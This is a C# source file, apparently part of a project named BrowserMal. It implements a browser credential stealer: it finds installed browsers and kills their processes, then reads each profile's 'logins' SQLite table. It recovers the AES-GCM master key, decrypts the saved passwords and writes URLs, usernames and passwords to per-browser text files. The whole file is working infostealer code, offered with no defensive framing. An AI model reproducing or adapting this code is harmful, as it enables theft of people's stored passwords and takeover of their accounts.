using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Text;
using SqliteReader;
using BrowserMal.Browser;
using BrowserMal.AES;
using BrowserMal.Credential;
using BrowserMal.Filesaver;
using System.IO;

namespace BrowserMal
{
    public class Class1
    {
        //private static string COOKIES_DATA_PATH = "\\Google\\Chrome\\User Data\\Default\\Network\\Cookies";

        private static readonly BrowserManager browserManager = new BrowserManager();

        public static void Start()
        {
            List<CredentialModel> result = new List<CredentialModel>();
            browserManager.Init();

            foreach (BrowserModel browser in browserManager.GetBrowsers())
            {
                result.Clear();

                if (!BrowserExists(browser.Location))
                    continue;

                KillProcess(browser.ProcessName);
                result.AddRange(GetLogins(browser.Location));

                if (result.Count == 0)
                    continue;

                FileManager.Save<CredentialModel>(result, $"{browser.Name}_logins.txt");
            }
        }

        private static List<CredentialModel> GetLogins(string path)
        {
            List<string> profiles = browserManager.GetProfiles(path);
            List<CredentialModel> creds = new List<CredentialModel>();

            foreach (string profile in profiles)
            {
                if (!File.Exists(profile))
                    continue;

                creds.AddRange(GetProfileLogins(profile));
            }

            return creds;
        }

        private static List<CredentialModel> GetProfileLogins(string path)
        {
            List<CredentialModel> credentialModels = new List<CredentialModel>();

            SqLiteHandler sqLiteHandler = new SqLiteHandler(path);
            sqLiteHandler.ReadTable("logins");

            byte[] masterKey = AesGcm256.GetMasterKey(path);

            if (masterKey == null)
                return new List<CredentialModel>();

            for (int i = 0; i <= sqLiteHandler.GetRowCount() - 1; i++)
            {
                try
                {
                    string password = GetEncryptedValue(sqLiteHandler.GetValue(i, "password_value"), masterKey);

                    if (string.IsNullOrEmpty(password))
                        continue;

                    credentialModels.Add(new CredentialModel()
                    {
                        Url = sqLiteHandler.GetValue(i, "origin_url"),
                        Username = sqLiteHandler.GetValue(i, "username_value"),
                        Password = password
                    });
                }
                catch { }
            }

            return credentialModels;
        }

        private static string GetEncryptedValue(string encrypted, byte[] masterKey)
        {
            if (encrypted.StartsWith("v10") || encrypted.StartsWith("v11"))
            {
                AesGcm256.Prepare(Encoding.Default.GetBytes(encrypted), out byte[] nonce, out byte[] ciphertextTag);
                return AesGcm256.Decrypt(ciphertextTag, masterKey, nonce);
            }

            return AesGcm256.DecryptNoKey(Encoding.Default.GetBytes(encrypted));
        }

        private static bool BrowserExists(string path) => Directory.Exists(path);

        private static void KillProcess(string name)
        {
            Process[] processes = Process.GetProcessesByName(name);

            foreach (var process in processes)
            {
                try
                {
                    process.Kill();
                }
                catch { }
            }
        }
    }
}
